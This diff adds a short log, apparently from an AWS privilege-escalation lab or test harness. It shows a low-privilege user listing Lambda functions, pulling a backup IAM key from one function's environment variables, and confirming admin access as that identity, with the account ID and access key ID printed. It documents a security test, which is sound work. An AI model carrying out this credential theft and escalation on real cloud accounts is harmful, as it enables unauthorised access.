@@ -1,0 +1,21 @@
+[*] acting as: arn:aws:iam::559292738121:user/pathtriage-low-priv-attacker
+[*] Step 1: baseline probe — low-priv user iam:CreateUser?
+    [+] iam:CreateUser denied (as expected)
+[*] Step 2: enumerating Lambda functions in region
+    [+] found 2 function(s)
+        - pathtriage-07-internal-data-sync
+        - hello-world-web
+[*] Step 3: scanning each function's environment variables for credential patterns
+    [+] pathtriage-07-internal-data-sync: credentials found in env vars
+        env keys: ['BACKUP_AWS_ACCESS_KEY_ID', 'BACKUP_AWS_SECRET_ACCESS_KEY', 'BUCKET_NAME', 'ENVIRONMENT', 'LOG_LEVEL']
+
+[*] Step 4: using stolen credentials off-band via boto3
+        AccessKeyId:     AKIAYEODR5JEZ3EDYXNY
+        SecretAccessKey: jaZv...7Ah5 (masked)
+        Source:          Lambda function pathtriage-07-internal-data-sync (env vars)
+        Type:            long-term IAM key
+    [+] now: arn:aws:iam::559292738121:user/pathtriage-07-backup-user
+[*] Step 5: privileged probe — iam:CreateUser as the stolen identity
+    [+] iam:CreateUser SUCCEEDS — stolen identity is admin
+
+[+] Path 07 verified: lambda:GetFunctionConfiguration -> env-var read -> off-band admin
